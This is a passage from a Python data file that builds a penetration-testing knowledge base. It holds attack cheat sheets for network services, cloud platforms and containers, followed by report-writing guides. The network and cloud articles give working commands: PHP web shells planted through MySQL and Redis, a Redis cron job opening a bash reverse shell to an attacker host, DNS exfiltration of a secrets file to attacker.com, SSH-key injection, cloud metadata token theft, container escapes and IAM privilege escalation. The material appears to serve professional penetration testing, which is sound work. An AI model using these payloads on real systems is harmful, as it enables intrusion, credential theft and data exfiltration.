# Dynamic SOCKS proxy
ssh -D 9050 user@jump-host
# Use with: proxychains nmap -sT internal-target

# Multiple forwards
ssh -L 9090:host1:80 -L 9091:host2:443 user@jump-host

# Keep alive and background
ssh -fN -L 9090:internal:80 user@jump-host
```

## ProxyChains Config
```
# /etc/proxychains.conf
socks5 127.0.0.1 9050
```

## Tips
- Use `-N` flag when you only need the tunnel (no shell)
- Chain multiple SSH hops for deep network access
- Use `~C` to add forwards to existing sessions
- autossh maintains persistent tunnels
""",
    },
    {
        "title": "DNS Tunneling",
        "category": "Network",
        "tags": "dns,tunneling,exfiltration,covert,iodine",
        "content": """# DNS Tunneling

## Overview
Tunnel data through DNS queries to bypass network restrictions.

## Tools
```bash
# iodine (IP over DNS)
# Server (attacker):
iodined -f -c -P password 10.0.0.1 tunnel.attacker.com
# Client (target):
iodine -f -P password tunnel.attacker.com

# dnscat2
# Server:
ruby dnscat2.rb tunnel.attacker.com
# Client:
./dnscat2 tunnel.attacker.com

# DNSExfiltrator (PowerShell)
Invoke-DNSExfiltrator -Domain attacker.com -File secrets.txt
```

## Requirements
- You control a DNS server (NS record for subdomain)
- UDP port 53 is allowed outbound (almost always true)

## Tips
- DNS tunneling is slow but bypasses most firewalls
- Use for C2 when HTTP/HTTPS is blocked
- Detection: look for unusual DNS query volume/lengths
- Encode data in subdomain labels (max 63 chars per label)
""",
    },
    {
        "title": "Network Pivoting with Ligolo-ng",
        "category": "Network",
        "tags": "ligolo,pivoting,tunnel,network,proxy",
        "content": """# Ligolo-ng Pivoting

## Overview
Modern tunneling tool for accessing internal networks through compromised hosts.

## Setup
```bash
# Attacker (proxy)
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
ligolo-proxy -selfcert -laddr 0.0.0.0:11601

# Agent (compromised host)
./agent -connect attacker:11601 -ignore-cert

# In ligolo proxy interface:
session          # Select session
ifconfig         # View agent interfaces
start            # Start tunnel

# Add routes on attacker
sudo ip route add 10.10.10.0/24 dev ligolo
```

## Features
- No SOCKS overhead (kernel-level tunneling)
- Multiple agents/sessions
- Port forwarding (listeners)
- Works on Windows and Linux

## Tips
- Faster than SOCKS-based tools for most operations
- Add listener for reverse shells through the tunnel
- Chain multiple agents for double-pivots
""",
    },
    {
        "title": "Wireless WPA/WPA2 Cracking",
        "category": "Network",
        "tags": "wireless,wpa,cracking,aircrack,handshake",
        "content": """# WPA/WPA2 Cracking

## Overview
Capture and crack WPA/WPA2 handshakes for network access.

## Steps
```bash
# 1. Enable monitor mode
airmon-ng start wlan0

# 2. Scan for networks
airodump-ng wlan0mon

# 3. Capture handshake
airodump-ng -c CHANNEL --bssid BSSID -w capture wlan0mon

# 4. Deauth to force reconnection
airecrack-ng -0 5 -a BSSID wlan0mon

# 5. Crack with aircrack-ng
aircrack-ng -w wordlist.txt capture-01.cap

# 5b. Crack with hashcat (faster, GPU)
hcxpcapngtool capture-01.cap -o hash.hc22000
hashcat -m 22000 hash.hc22000 wordlist.txt

# PMKID attack (no client needed)
hcxdumptool -i wlan0mon --enable_status=1 -o pmkid.pcapng
hcxpcapngtool pmkid.pcapng -o pmkid.hc22000
hashcat -m 22000 pmkid.hc22000 wordlist.txt
```

## Tips
- PMKID attack doesn't require capturing a handshake
- Use rules with hashcat for better coverage
- WPA3 (SAE) is resistant to offline attacks
""",
    },
    {
        "title": "FTP Exploitation",
        "category": "Network",
        "tags": "ftp,anonymous,exploit,enumeration,network",
        "content": """# FTP Exploitation

## Overview
Common FTP attack vectors and enumeration techniques.

## Commands
```bash
# Anonymous login
ftp 192.168.1.1
# User: anonymous, Pass: (blank or email)

# Nmap FTP scripts
nmap --script ftp-anon,ftp-bounce,ftp-vsftpd-backdoor -p 21 192.168.1.1

# Brute-force
hydra -l admin -P wordlist.txt ftp://192.168.1.1

# Download all files
wget -r ftp://anonymous:@192.168.1.1/

# Check for writable directories
# Upload test file and check for code execution
```

## Key Vulnerabilities
- Anonymous access (read/write)
- vsFTPd 2.3.4 backdoor (port 6200)
- ProFTPD mod_copy (unauthenticated file copy)
- FTP bounce scanning (use as proxy)

## Tips
- Check for cleartext credentials in captured traffic
- Writable FTP + web root = web shell upload
- FTP passive mode may reveal internal IPs
""",
    },
    {
        "title": "MSSQL Exploitation",
        "category": "Network",
        "tags": "mssql,database,xp_cmdshell,sqli,network",
        "content": """# MSSQL Exploitation

## Overview
Attack Microsoft SQL Server for command execution and data access.

## Commands
```bash
# Impacket mssqlclient
mssqlclient.py user:password@192.168.1.1

# Enable xp_cmdshell
SQL> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
SQL> xp_cmdshell 'whoami'

# Capture NTLM hash
SQL> xp_dirtree '\\\\attacker\\share'
# Run Responder/smbserver on attacker

# Linked servers
SQL> SELECT * FROM sys.servers;
SQL> EXECUTE('xp_cmdshell ''whoami''') AT [LINKED_SERVER]

# Impersonate user
SQL> EXECUTE AS LOGIN = 'sa'; SELECT SYSTEM_USER;

# Nmap enumeration
nmap --script ms-sql-info,ms-sql-config -p 1433 192.168.1.1
```

## Tips
- Default port: 1433 (TCP), 1434 (UDP browser service)
- xp_cmdshell gives OS command execution
- Check for linked servers for lateral movement
- sa account often has weak or default passwords
""",
    },
    {
        "title": "MySQL/MariaDB Exploitation",
        "category": "Network",
        "tags": "mysql,mariadb,database,udf,network",
        "content": """# MySQL/MariaDB Exploitation

## Overview
Attack MySQL servers for data access and command execution.

## Commands
```bash
# Connect
mysql -u root -p -h 192.168.1.1

# Remote login (if allowed)
mysql -u root -h 192.168.1.1

# File read
SELECT LOAD_FILE('/etc/passwd');

# File write (into web root)
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';

# UDF (User Defined Function) for command execution
# Compile and upload raptor_udf.so
CREATE FUNCTION sys_exec RETURNS STRING SONAME 'raptor_udf.so';
SELECT sys_exec('id');

# Brute-force
hydra -l root -P wordlist.txt mysql://192.168.1.1
```

## Tips
- Default port: 3306
- Check if root has no password (common in dev)
- FILE privilege allows reading/writing server files
- INTO OUTFILE requires writable web directory path
""",
    },
    {
        "title": "Redis Exploitation",
        "category": "Network",
        "tags": "redis,exploitation,rce,unauthorized,network",
        "content": """# Redis Exploitation

## Overview
Exploit unauthenticated Redis instances for RCE.

## Commands
```bash
# Connect (no auth)
redis-cli -h 192.168.1.1

# Info gathering
INFO
CONFIG GET *

# Write SSH key
redis-cli -h 192.168.1.1
SET sshkey "\\n\\nssh-rsa AAAA... attacker\\n\\n"
CONFIG SET dir /root/.ssh
CONFIG SET dbfilename authorized_keys
SAVE

# Write web shell
CONFIG SET dir /var/www/html
CONFIG SET dbfilename shell.php
SET payload "<?php system($_GET['cmd']); ?>"
SAVE

# Write cron job
CONFIG SET dir /var/spool/cron/crontabs
CONFIG SET dbfilename root
SET cron "\\n* * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'\\n"
SAVE
```

## Tips
- Default port: 6379, often no authentication
- Check for protected-mode (disabled = exploitable remotely)
- Lua scripting (EVAL) may allow code execution
- Redis Rogue Server attack for newer versions
""",
    },
    # =========================================================================
    # CLOUD (17 articles)
    # =========================================================================
    {
        "title": "AWS Enumeration and Exploitation",
        "category": "Cloud",
        "tags": "aws,cloud,s3,iam,enumeration,exploitation",
        "content": """# AWS Enumeration & Exploitation

## Overview
Enumerate and exploit AWS services with compromised credentials.

## Commands
```bash
# Configure credentials
aws configure

# IAM enumeration
aws iam get-user
aws iam list-users
aws iam list-roles
aws iam list-attached-user-policies --user-name target

# S3 enumeration
aws s3 ls
aws s3 ls s3://bucket-name --no-sign-request
aws s3 cp s3://bucket-name/file ./file

# EC2
aws ec2 describe-instances
aws ec2 describe-security-groups

# Lambda
aws lambda list-functions
aws lambda get-function --function-name NAME

# Secrets Manager
aws secretsmanager list-secrets
aws secretsmanager get-secret-value --secret-id NAME
```

## Privilege Escalation
- Attach admin policy to own user
- Create new access keys for other users
- Assume roles with broader permissions
- Lambda function with admin role

## Tips
- Use Pacu for automated AWS exploitation
- Check instance metadata: 169.254.169.254
- Look for hardcoded credentials in Lambda env vars
""",
    },
    {
        "title": "Azure Penetration Testing",
        "category": "Cloud",
        "tags": "azure,cloud,aad,enumeration,exploitation",
        "content": """# Azure Penetration Testing

## Overview
Enumerate and exploit Azure/Entra ID environments.

## Commands
```bash
# Azure CLI login
az login

# Enumerate subscriptions
az account list

# List VMs
az vm list --output table

# Storage accounts
az storage account list
az storage container list --account-name NAME

# Azure AD enumeration
az ad user list
az ad group list
az ad app list

# ROADTools (Entra ID)
roadrecon gather --access-token TOKEN
roadrecon gui

# AzureHound (BloodHound for Azure)
azurehound -t TOKEN list --tenant TENANT_ID -o output.json
```

## Key Attacks
- Password spraying against Azure AD
- Consent grant phishing (OAuth app abuse)
- Token theft from Azure CLI/PowerShell cache
- Managed Identity abuse on compromised VMs

## Tips
- Azure AD tokens are JWTs; inspect for permissions
- Check for overly permissive app registrations
- Storage account keys provide full access if leaked
""",
    },
    {
        "title": "GCP Penetration Testing",
        "category": "Cloud",
        "tags": "gcp,google-cloud,iam,storage,enumeration",
        "content": """# GCP Penetration Testing

## Overview
Enumerate and exploit Google Cloud Platform resources.

## Commands
```bash
# Authenticate
gcloud auth activate-service-account --key-file=key.json
gcloud auth login

# Project enumeration
gcloud projects list
gcloud config set project PROJECT_ID

# IAM
gcloud iam service-accounts list
gcloud projects get-iam-policy PROJECT_ID

# Compute
gcloud compute instances list
gcloud compute firewall-rules list

# Storage
gsutil ls
gsutil ls gs://bucket-name
gsutil cp gs://bucket-name/file ./file

# Check for public buckets
gsutil ls gs://company-backup  # Try common names
```

## Key Attacks
- Service account key theft
- Metadata server access (169.254.169.254)
- IAM privilege escalation via setIamPolicy
- Custom role with escalation permissions

## Tips
- Default SA on Compute has broad access (editor role)
- Check for service account impersonation chains
- Cloud Functions may have overprivileged SAs
""",
    },
    {
        "title": "Cloud Metadata Service Exploitation",
        "category": "Cloud",
        "tags": "metadata,imds,ssrf,cloud,credentials",
        "content": """# Cloud Metadata Service Exploitation

## Overview
Access cloud instance metadata to steal credentials and configuration.

## Endpoints
```bash
# AWS IMDSv1
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME

# AWS IMDSv2 (token required)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/

# GCP
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure
curl -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

## Tips
- Primary target for SSRF attacks in cloud environments
- IMDSv2 mitigates most SSRF-based attacks (requires PUT token)
- Stolen credentials are temporary but often very privileged
- Check user-data for initialization scripts with secrets
""",
    },
    {
        "title": "S3 Bucket Misconfiguration",
        "category": "Cloud",
        "tags": "s3,bucket,aws,misconfiguration,public",
        "content": """# S3 Bucket Misconfiguration

## Overview
Discover and exploit misconfigured S3 buckets.

## Commands
```bash
# Check if bucket exists and is public
aws s3 ls s3://company-name --no-sign-request

# List all objects
aws s3 ls s3://bucket-name --recursive --no-sign-request

# Download files
aws s3 cp s3://bucket-name/secrets.txt ./secrets.txt --no-sign-request

# Check ACL
aws s3api get-bucket-acl --bucket bucket-name --no-sign-request

# Check bucket policy
aws s3api get-bucket-policy --bucket bucket-name --no-sign-request

# Test write access
aws s3 cp test.txt s3://bucket-name/test.txt --no-sign-request

# Enumerate bucket names
# Try: company-name, company-backup, company-dev, company-staging
```

## Tips
- Use tools like cloud_enum, S3Scanner for automated discovery
- Check for sensitive files: .env, credentials, databases, backups
- Write access can lead to website defacement or code injection
- Check both authenticated and unauthenticated access
""",
    },
    {
        "title": "Kubernetes Security Assessment",
        "category": "Cloud",
        "tags": "kubernetes,k8s,container,rbac,pod",
        "content": """# Kubernetes Security Assessment

## Overview
Enumerate and exploit Kubernetes cluster misconfigurations.

## Commands
```bash
# Check access
kubectl auth can-i --list
kubectl auth can-i create pods

# Enumerate resources
kubectl get namespaces
kubectl get pods --all-namespaces
kubectl get secrets --all-namespaces
kubectl get serviceaccounts --all-namespaces

# Read secrets
kubectl get secret SECRET_NAME -o jsonpath='{.data}' | base64 -d

# Check RBAC
kubectl get clusterrolebindings
kubectl get rolebindings --all-namespaces

# Service account tokens
# In pod: cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Exec into pod
kubectl exec -it POD_NAME -- /bin/bash
```

## Key Misconfigurations
- Exposed API server (unauthenticated)
- Overpermissive RBAC (cluster-admin binding)
- Privileged containers
- Host filesystem mounts
- Default service account with permissions

## Tips
- Check for exposed kubelet API (10250)
- etcd (2379) may allow direct secret access
- Dashboard without auth = cluster admin access
""",
    },
    {
        "title": "Docker Security and Escape",
        "category": "Cloud",
        "tags": "docker,container,escape,privileged,security",
        "content": """# Docker Security & Container Escape

## Overview
Assess Docker security and escape from containers.

## Detection (Am I in a container?)
```bash
# Check for .dockerenv
ls -la /.dockerenv

# Check cgroups
cat /proc/1/cgroup | grep docker

# Limited processes
ps aux  # Very few processes = likely container
```

## Escape Techniques
```bash
# Privileged container escape
# If --privileged flag was used:
mkdir /mnt/host
mount /dev/sda1 /mnt/host
chroot /mnt/host

# Docker socket mounted
# If /var/run/docker.sock is accessible:
docker run -v /:/host -it alpine chroot /host

# Capabilities abuse (SYS_ADMIN)
mount -t cgroup -o rdma cgroup /mnt
# Write to release_agent for escape

# Host PID namespace
# If --pid=host: can see/ptrace host processes
nsenter -t 1 -m -u -i -n -p -- /bin/bash
```

## Tips
- Check for mounted Docker socket (most common escape)
- Privileged containers are equivalent to host root
- Network mode=host exposes all host network interfaces
- Capabilities like SYS_PTRACE enable various escapes
""",
    },
    {
        "title": "Terraform State File Exploitation",
        "category": "Cloud",
        "tags": "terraform,iac,state,secrets,cloud",
        "content": """# Terraform State File Exploitation

## Overview
Terraform state files often contain secrets in plaintext.

## What to Look For
```bash
# State file locations
terraform.tfstate
terraform.tfstate.backup
.terraform/

# Common secrets in state
- Database passwords
- API keys
- Private keys
- Cloud credentials
- Service account tokens

# Search state file
cat terraform.tfstate | jq '.resources[].instances[].attributes | select(.password != null)'
cat terraform.tfstate | jq '.resources[].instances[].attributes | select(.secret != null)'
```

## Discovery
- S3 buckets (common remote backend)
- Azure Storage Accounts
- GCS buckets
- GitLab/GitHub repos (accidentally committed)
- CI/CD pipeline artifacts

## Tips
- State files are often stored unencrypted in cloud storage
- Even if current state is clean, check state history
- Remote backends may have overly permissive access
- `terraform show` displays current state in readable format
""",
    },
    {
        "title": "Cloud IAM Privilege Escalation",
        "category": "Cloud",
        "tags": "iam,privilege-escalation,aws,gcp,azure,cloud",
        "content": """# Cloud IAM Privilege Escalation

## Overview
Escalate cloud permissions through IAM misconfigurations.

## AWS Escalation Paths
```bash
# Attach admin policy
aws iam attach-user-policy --user-name USER --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Create access keys for another user
aws iam create-access-key --user-name admin

# Update login profile (reset password)
aws iam update-login-profile --user-name admin --password NewPass123!

# Assume role
aws sts assume-role --role-arn arn:aws:iam::ACCOUNT:role/admin-role --role-session-name test

# Lambda + PassRole
aws lambda create-function --function-name escalate --role ADMIN_ROLE_ARN --handler index.handler --runtime python3.9 --zip-file fileb://payload.zip
```

## GCP Escalation Paths
- setIamPolicy on project/org
- Service account key creation
- actAs permission for impersonation
- deploymentmanager.deployments.create

## Azure Escalation Paths
- User Administrator role
- Application admin (add credentials to app)
- Privileged Role Administrator

## Tips
- Use Pacu (AWS), ScoutSuite, or Prowler for automated checks
- Map all permissions before attempting escalation
- Look for custom policies with overly broad wildcards
""",
    },
    {
        "title": "Serverless Function Exploitation",
        "category": "Cloud",
        "tags": "lambda,serverless,functions,cloud,exploitation",
        "content": """# Serverless Function Exploitation

## Overview
Attack serverless functions (Lambda, Cloud Functions, Azure Functions).

## Enumeration
```bash
# AWS Lambda
aws lambda list-functions
aws lambda get-function --function-name NAME
aws lambda get-policy --function-name NAME

# Environment variables (often contain secrets)
aws lambda get-function-configuration --function-name NAME | jq '.Environment.Variables'

# GCP Cloud Functions
gcloud functions list
gcloud functions describe FUNCTION_NAME

# Azure Functions
az functionapp list
az functionapp config appsettings list -n NAME -g RESOURCE_GROUP
```

## Attack Vectors
- Event injection (malicious input in triggers)
- Environment variable secrets
- Overprivileged execution roles
- Dependency confusion in layers/packages
- Cold start timing attacks
- /tmp directory persistence between invocations

## Tips
- Functions often run with broader permissions than needed
- Check event source mapping for injection points
- Temporary credentials from metadata service
- Function URLs may be publicly accessible
""",
    },
    {
        "title": "Cloud Storage Enumeration",
        "category": "Cloud",
        "tags": "storage,s3,gcs,azure-blob,enumeration,cloud",
        "content": """# Cloud Storage Enumeration

## Overview
Discover and access misconfigured cloud storage across providers.

## AWS S3
```bash
# Brute-force bucket names
aws s3 ls s3://COMPANY-NAME --no-sign-request
# Common patterns: company-backup, company-dev, company-assets

# Automated enumeration
cloud_enum -k company-name
```

## GCP Storage
```bash
gsutil ls gs://COMPANY-NAME
# Check for allUsers/allAuthenticatedUsers access
```

## Azure Blob Storage
```bash
# Enumerate containers
az storage container list --account-name ACCOUNT --auth-mode anonymous

# Access public blobs
curl "https://ACCOUNT.blob.core.windows.net/CONTAINER/FILE"
```

## Tips
- Try permutations: prod, dev, staging, backup, logs, data
- Check for directory listing enabled
- Look for sensitive file patterns: .env, .sql, .bak, credentials
- Authenticated users may have different (broader) access
""",
    },
    # =========================================================================
    # REPORTING (12 articles)
    # =========================================================================
    {
        "title": "Writing Executive Summaries",
        "category": "Reporting",
        "tags": "executive-summary,report,writing,management",
        "content": """# Writing Executive Summaries

## Overview
Communicate findings to non-technical stakeholders effectively.

## Structure
1. **Engagement Overview**: Scope, timeline, methodology
2. **Key Findings**: Top 3-5 critical issues in business terms
3. **Risk Assessment**: Overall security posture rating
4. **Recommendations**: Prioritized remediation roadmap
5. **Positive Findings**: Security controls working well

## Tips
- Lead with business impact, not technical details
- Use risk ratings that map to business context
- Include a one-paragraph "bottom line" at the top
- Quantify where possible (X% of systems vulnerable)
- Keep to 1-2 pages maximum
- Avoid jargon; explain technical concepts simply
- Include a risk matrix or heat map for visual impact

## Common Mistakes
- Too much technical detail
- Only listing problems (no positive observations)
- No clear prioritization
- Missing remediation timeline recommendations
""",
    },
    {
        "title": "CVSS Scoring Guide",
        "category": "Reporting",
        "tags": "cvss,scoring,severity,vulnerability,rating",
        "content": """# CVSS v3.1 Scoring Guide

## Base Metrics

### Attack Vector (AV)
- Network (N): Remotely exploitable
- Adjacent (A): Requires local network access
- Local (L): Requires local access
- Physical (P): Requires physical access

### Attack Complexity (AC)
- Low (L): No special conditions
- High (H): Requires specific conditions to exploit

### Privileges Required (PR)
- None (N): No authentication needed
- Low (L): Basic user privileges
- High (H): Administrative privileges

### User Interaction (UI)
- None (N): No user action required
- Required (R): User must perform action

### Scope (S)
- Unchanged (U): Impact limited to vulnerable component
- Changed (C): Impact extends beyond vulnerable component

### Impact (C/I/A)
- High (H): Total loss of confidentiality/integrity/availability
- Low (L): Limited impact
- None (N): No impact

## Severity Ratings
- 0.0: None
- 0.1-3.9: Low
- 4.0-6.9: Medium
- 7.0-8.9: High
- 9.0-10.0: Critical

## Tips
- Score the worst realistic impact, not theoretical maximum
- Consider environmental context for client-specific scoring
- Document reasoning for each metric selection
""",
    },
    {
        "title": "Finding Write-Up Best Practices",
        "category": "Reporting",
        "tags": "finding,writeup,vulnerability,description,report",
        "content": """# Finding Write-Up Best Practices

## Structure
1. **Title**: Clear, specific vulnerability name
2. **Severity**: CVSS score with vector string
3. **Affected Systems**: Specific hosts/URLs/parameters
4. **Description**: What the vulnerability is
5. **Impact**: What an attacker could do
6. **Steps to Reproduce**: Exact reproduction steps
7. **Evidence**: Screenshots, request/response
8. **Remediation**: Specific fix guidance
9. **References**: CWE, CVE, OWASP mapping

## Example Title Formats
- "SQL Injection in Login Form Parameter (Critical)"
- "Missing Rate Limiting on Authentication Endpoint (Medium)"
- "Outdated Apache Struts with Known RCE (Critical)"

## Tips
- Make reproduction steps detailed enough for dev team
- Include both technical remediation and strategic recommendations
- Reference industry standards (OWASP, CIS, NIST)
- Show impact with evidence, not just claims
- Include PoC that demonstrates impact without causing damage
""",
    },
    {
        "title": "Evidence Collection Guidelines",
        "category": "Reporting",
        "tags": "evidence,screenshots,documentation,proof",
        "content": """# Evidence Collection Guidelines

## What to Capture
- Full HTTP request and response (Burp, curl -v)
- Terminal output showing successful exploitation
- Screenshots of application behavior
- Network captures (pcap) for network attacks
- Configuration files showing misconfigurations
- Tool output with timestamps

## Best Practices
```
# Always include timestamps
date && command_here

# Use script command for terminal logging
script -a evidence_session.log
# ... do testing ...
exit

# Save Burp requests
# Right-click → Copy as curl command
# Or: Save item → Request and Response

# Screenshots
# Include URL bar, full page, and timestamp
# Annotate with arrows/boxes for clarity
```

## Organization
- Name files descriptively: VULN-001_sqli_login_page.png
- Maintain chain of custody for sensitive evidence
- Hash important evidence files (SHA-256)
- Store chronologically within engagement folder

## Tips
- Capture evidence BEFORE the client is notified
- More evidence is better than less
- Show the full attack chain, not just the final result
- Redact sensitive data (other users' info) in reports
""",
    },
    {
        "title": "Remediation Recommendations",
        "category": "Reporting",
        "tags": "remediation,recommendations,fix,mitigation",
        "content": """# Writing Remediation Recommendations

## Structure
1. **Immediate Actions** (Quick Wins): Patch, disable, restrict
2. **Short-term Fixes** (1-4 weeks): Configuration changes, updates
3. **Long-term Improvements** (1-6 months): Architecture, process

## Common Remediations
- SQL Injection → Parameterized queries, input validation, WAF
- XSS → Output encoding, CSP, input sanitization
- Weak passwords → Policy enforcement, MFA, account lockout
- Missing patches → Patch management process, auto-updates
- Default credentials → Change on deployment, credential rotation
- SSRF → Allowlist outbound connections, disable metadata access

## Tips
- Be specific: "Update Apache to version 2.4.58+" not "Update Apache"
- Include effort estimate when possible
- Prioritize by risk AND implementation difficulty
- Suggest compensating controls when fixes are complex
- Reference vendor documentation for implementation details
- Acknowledge when a fix may break functionality
""",
    },
    {
        "title": "Risk Rating Methodology",
        "category": "Reporting",
        "tags": "risk,rating,methodology,impact,likelihood",
        "content": """# Risk Rating Methodology

## CVSS-Based Approach
- Use CVSS base score as starting point
- Adjust with temporal and environmental metrics
- Map to organizational risk levels

## Likelihood × Impact Matrix
```
              | Low Impact | Med Impact | High Impact |
Low Likelihood  |    Low     |    Low     |   Medium   |
Med Likelihood  |    Low     |   Medium   |    High    |
High Likelihood |   Medium   |    High    |  Critical  |
```

## Factors Affecting Likelihood
- Attack complexity
- Required privileges
- Network accessibility
- Exploit availability
- Attacker motivation

## Factors Affecting Impact
- Data sensitivity
- System criticality
- Regulatory implications
- Business disruption potential
- Reputational damage

## Tips
- Document your methodology at the start of the report
- Be consistent across all findings
- Consider the client's specific context
- Separate technical severity from business risk
- Risk acceptance should be a documented client decision
""",
    },
    {
        "title": "Report Structure Template",
        "category": "Reporting",
        "tags": "report,template,structure,sections,deliverable",
        "content": """# Penetration Test Report Template

## Sections

### 1. Cover Page
- Client name, report title, date, classification

### 2. Document Control
- Version history, distribution list, confidentiality notice

### 3. Executive Summary (1-2 pages)
- Overview, key findings, risk rating, recommendations

### 4. Methodology
- Standards followed (OWASP, PTES, OSSTMM)
- Tools used, testing approach, scope

### 5. Scope
- In-scope systems, out-of-scope items, testing window

### 6. Findings (bulk of report)
- Sorted by severity (Critical → Low)
- Each finding follows consistent structure
- Include remediation for each

### 7. Risk Matrix/Summary Table
- All findings in tabular format
- Severity, status, affected system

### 8. Recommendations Roadmap
- Prioritized actions with timeline

### 9. Appendices
- Raw tool output, additional evidence, methodology details

## Tips
- Tailor depth to audience (technical vs management)
- Include positive findings (what's working well)
- Provide both PDF and editable formats
""",
    },
    {
        "title": "Engagement Scoping Checklist",
        "category": "Reporting",
        "tags": "scoping,engagement,planning,checklist,rules",
        "content": """# Engagement Scoping Checklist

## Pre-Engagement Items
- [ ] Signed statement of work / contract
- [ ] Rules of engagement document
- [ ] Authorized IP ranges / domains
- [ ] Excluded systems / IPs
- [ ] Testing hours / windows
- [ ] Emergency contacts (client)
- [ ] Escalation procedures
- [ ] Data handling requirements
- [ ] Get-out-of-jail letter (authorization)
- [ ] NDA signed

## Scope Definition
- [ ] Network ranges (internal/external)
- [ ] Web applications (URLs)
- [ ] APIs (endpoints, documentation)
- [ ] Cloud environments (accounts, regions)
- [ ] Physical locations (if applicable)
- [ ] Social engineering scope (if applicable)
- [ ] Wireless scope (SSIDs, locations)

## Constraints
- [ ] No denial of service testing
- [ ] No data exfiltration of real data
- [ ] Production vs staging environment
- [ ] Rate limiting requirements
- [ ] Notification requirements for findings

## Tips
- Get everything in writing before testing starts
- Clarify incident response expectations
- Define communication channels and frequency
- Agree on finding severity thresholds for immediate reporting
""",
    },
    {
        "title": "MITRE ATT&CK Mapping for Reports",
        "category": "Reporting",
        "tags": "mitre,attack,mapping,ttp,framework",
        "content": """# MITRE ATT&CK Mapping for Reports

## Overview
Map findings to ATT&CK framework for standardized reporting.

## Common Mappings
```
Reconnaissance:
- T1595: Active Scanning
- T1592: Gather Victim Host Info
- T1589: Gather Victim Identity Info

Initial Access:
- T1190: Exploit Public-Facing Application
- T1133: External Remote Services
- T1078: Valid Accounts

Execution:
- T1059: Command and Scripting Interpreter
- T1203: Exploitation for Client Execution

Privilege Escalation:
- T1068: Exploitation for Privilege Escalation
- T1548: Abuse Elevation Control Mechanism

Credential Access:
- T1110: Brute Force
- T1003: OS Credential Dumping
- T1558: Steal or Forge Kerberos Tickets

Lateral Movement:
- T1021: Remote Services
- T1550: Use Alternate Authentication Material

Exfiltration:
- T1048: Exfiltration Over Alternative Protocol
- T1567: Exfiltration Over Web Service
```

## Tips
- Include ATT&CK IDs in finding descriptions
- Create a coverage matrix showing tested techniques
- Map to sub-techniques for precision
- Use ATT&CK Navigator for visual representation
""",
    },
    {
        "title": "Compliance Mapping (PCI-DSS, HIPAA, SOC2)",
        "category": "Reporting",
        "tags": "compliance,pci,hipaa,soc2,mapping,regulation",
        "content": """# Compliance Mapping for Findings

## PCI-DSS v4.0 Common Mappings
- Req 2: No default/vendor passwords → Default Credentials finding
- Req 4: Encrypt transmission → TLS/SSL findings
- Req 6: Secure development → Web application vulns
- Req 8: Authentication controls → Weak password findings
- Req 11: Regular testing → Vulnerability scan findings

## HIPAA Technical Safeguards
- Access Control (164.312(a)) → Authentication/authorization findings
- Audit Controls (164.312(b)) → Logging deficiency findings
- Integrity Controls (164.312(c)) → Data tampering findings
- Transmission Security (164.312(e)) → Encryption findings

## SOC 2 Trust Criteria
- CC6.1: Logical access security → Access control findings
- CC6.6: System boundaries → Network segmentation findings
- CC7.2: Monitoring anomalies → Detection gap findings
- CC8.1: Change management → Configuration management findings

## Tips
- Map findings to specific control requirements
- Include compliance impact in executive summary
- Reference specific regulation section numbers
- Note which findings could trigger compliance violations
- Help client understand regulatory notification obligations
""",
    },
    {
        "title": "Penetration Testing Methodology (PTES)",
        "category": "Reporting",
        "tags": "ptes,methodology,phases,standard,testing",
        "content": """# PTES - Penetration Testing Execution Standard

## Phases

### 1. Pre-Engagement Interactions
- Scope definition, authorization, rules of engagement
- Timeline, contacts, legal documentation

### 2. Intelligence Gathering
- Passive reconnaissance (OSINT)
- Active reconnaissance (scanning, enumeration)
- Target identification and mapping

### 3. Threat Modeling
- Identify assets and entry points
- Map attack surfaces
- Prioritize testing areas

### 4. Vulnerability Analysis
- Automated scanning
- Manual testing
- Validation of findings

### 5. Exploitation
- Confirm vulnerabilities are exploitable
- Demonstrate impact
- Document proof of concept

### 6. Post-Exploitation
- Determine compromise value
- Identify further access opportunities
- Data access assessment

### 7. Reporting
- Executive summary
- Technical findings
- Remediation recommendations

## Tips
- Follow methodology consistently for repeatable results
- Document deviations from standard methodology
- Adapt approach to engagement type and scope
- Time-box phases to ensure complete coverage
""",
    },
    {
        "title": "Debrief and Client Communication",
        "category": "Reporting",
        "tags": "debrief,communication,client,presentation",
        "content": """# Client Debrief Best Practices

## Preparation
- Draft findings before debrief (no surprises)
- Prepare non-technical summary for management
- Have detailed technical backup for questions
- Know your remediation recommendations cold

## Debrief Structure
1. Thank client for access and cooperation
2. Restate scope and methodology
3. Present high-level results (risk posture)
4. Walk through critical/high findings
5. Discuss remediation priorities
6. Answer questions
7. Agree on next steps and retest timeline

## Communication Tips
- Lead with positives (security wins)
- Frame findings as improvements, not failures
- Use analogies for non-technical stakeholders
- Be prepared for pushback on severity ratings
- Offer to support remediation efforts
- Set clear expectations for report delivery

## Follow-Up
- Deliver final report within agreed timeline
- Offer clarification on findings
- Schedule retest if applicable
- Provide supplementary references/resources
""",
    },
]
